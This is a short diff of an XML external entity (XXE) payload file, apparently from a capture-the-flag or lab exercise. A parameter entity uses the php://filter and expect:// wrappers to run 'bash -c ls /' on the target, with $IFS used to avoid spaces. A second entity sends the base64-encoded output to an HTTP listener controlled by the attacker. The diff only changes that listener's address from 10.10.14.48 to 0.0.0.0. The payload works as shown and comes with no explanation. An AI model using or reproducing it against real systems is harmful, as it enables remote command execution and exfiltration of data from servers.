@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://bash$IFS-c$IFS'ls$IFS/'">
-<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://10.10.14.48:8000/?content=%file;'>">
+<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://0.0.0.0:8000/?content=%file;'>">
 %oob;
